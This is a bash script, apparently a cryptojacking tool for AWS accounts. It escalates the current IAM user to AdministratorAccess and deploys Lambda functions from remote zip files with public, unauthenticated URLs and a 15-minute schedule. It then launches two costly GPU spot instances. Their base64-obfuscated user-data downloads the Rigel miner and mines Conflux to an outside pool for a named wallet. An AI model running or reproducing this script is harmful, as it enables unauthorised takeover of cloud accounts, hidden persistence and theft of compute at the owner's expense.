#!/bin/bash

export AWS_PAGER=""

echo "Configuration Resource..."
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
USER_NAME=$(aws sts get-caller-identity --query "Arn" --output text | cut -d'/' -f2)
AZ=$(aws ec2 describe-instance-type-offerings --location-type availability-zone --filters Name=instance-type,Values=p6-b200.48xlarge --query "InstanceTypeOfferings[0].Location" --output text)
SUBNET_ID=$(aws ec2 describe-subnets --filters Name=availability-zone,Values=$AZ --query "Subnets[0].SubnetId" --output text)
SG_ID=$(aws ec2 describe-security-groups --filters Name=group-name,Values=default --query "SecurityGroups[0].GroupId" --output text)

echo "Download Source..."
wget -q -O test1.zip https://github.com/tungm2694-dev/zxc/raw/refs/heads/main/test1.zip
wget -q -O test2.zip https://github.com/tungm2694-dev/zxc/raw/refs/heads/main/test2.zip

echo "Setup IAM (User Policy & Role)..."
aws iam attach-user-policy --user-name "$USER_NAME" --policy-arn arn:aws:iam::aws:policy/AdministratorAccess > /dev/null 2>&1
sleep 20
aws iam create-role --role-name test --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["sts:AssumeRole"],"Principal":{"Service":["lambda.amazonaws.com"]}}]}' > /dev/null 2>&1
aws iam attach-role-policy --role-name test --policy-arn arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole > /dev/null 2>&1
sleep 20

echo "Deploying Lambda test1..."
aws lambda create-function --function-name test1 --runtime provided.al2 --role arn:aws:iam::"$ACCOUNT_ID":role/test --handler hello.handler --zip-file fileb://test1.zip --timeout 900 --memory-size 10240 --package-type zip --architectures x86_64 > /dev/null 2>&1
aws lambda create-function-url-config --function-name test1 --auth-type NONE --invoke-mode BUFFERED > /dev/null 2>&1
aws lambda add-permission --function-name test1 --statement-id FunctionURLAllowPublicAccess --action lambda:InvokeFunctionUrl --principal "*" --function-url-auth-type NONE > /dev/null 2>&1
aws lambda add-permission --function-name test1 --statement-id FunctionURLAllowInvokeAction --action lambda:InvokeFunction --principal "*" --invoked-via-function-url > /dev/null 2>&1
sleep 20
FUNCTION_URL=$(aws lambda get-function-url-config --function-name test1 --query 'FunctionUrl' --output text)

echo "Deploying Lambda test2 & Scheduler..."
aws lambda create-function --function-name test2 --runtime provided.al2 --role arn:aws:iam::"$ACCOUNT_ID":role/test --handler hello.handler --zip-file fileb://test2.zip --timeout 30 --memory-size 10240 --package-type zip --architectures x86_64 --environment Variables={TEST="$FUNCTION_URL"} > /dev/null 2>&1
aws events put-rule --name "ScheduledFunctionRule" --schedule-expression "rate(15 minutes)" --state ENABLED > /dev/null 2>&1
sleep 5
aws lambda add-permission --function-name test2 --statement-id EventBridgeInvoke --action lambda:InvokeFunction --principal events.amazonaws.com --source-arn $(aws events describe-rule --name ScheduledFunctionRule --query 'Arn' --output text) > /dev/null 2>&1
aws events put-targets --rule ScheduledFunctionRule --targets "Id"="1","Arn"="$(aws lambda get-function --function-name test2 --query 'Configuration.FunctionArn' --output text)" > /dev/null 2>&1

echo "Create EC2..."
INSTANCES=$(aws ec2 run-instances \
    --image-id 'ami-0babae1521ca1a4c3' \
    --instance-type 'p6-b200.48xlarge' \
    --count 2 \
    --instance-market-options '{"MarketType":"spot"}' \
    --user-data "IyEvYmluL2Jhc2gKc3VkbyB3Z2V0IGh0dHBzOi8vZ2l0aHViLmNvbS9yaWdlbG1pbmVyL3JpZ2VsL3JlbGVhc2VzL2Rvd25sb2FkLzEuMjMuMS9yaWdlbC0xLjIzLjEtbGludXgudGFyLmd6CnN1ZG8gdGFyIC14ZiByaWdlbC0xLjIzLjEtbGludXgudGFyLmd6CnN1ZG8gcmlnZWwtMS4yMy4xLWxpbnV4L3JpZ2VsIC1hIG9jdG9wdXMgLW8gc3RyYXR1bSt0Y3A6Ly91czIuY29uZmx1eC5oZXJvbWluZXJzLmNvbToxMTcwIC11IGNmeDphYXJ4MzhqYjRteXBqMDRtZHVrbTFkN25yY3UzNnVtM3BlNmdwejBrYm0gLXcgc2t5Ymx1ZQo=" \
    --network-interfaces "[{\"SubnetId\":\"$SUBNET_ID\",\"AssociatePublicIpAddress\":true,\"DeviceIndex\":0,\"Groups\":[\"$SG_ID\"]}]" \
    --query "Instances[*].InstanceId" --output text)

echo "DEPLYOMENT DONE!"
echo "Instance ID: $INSTANCES"
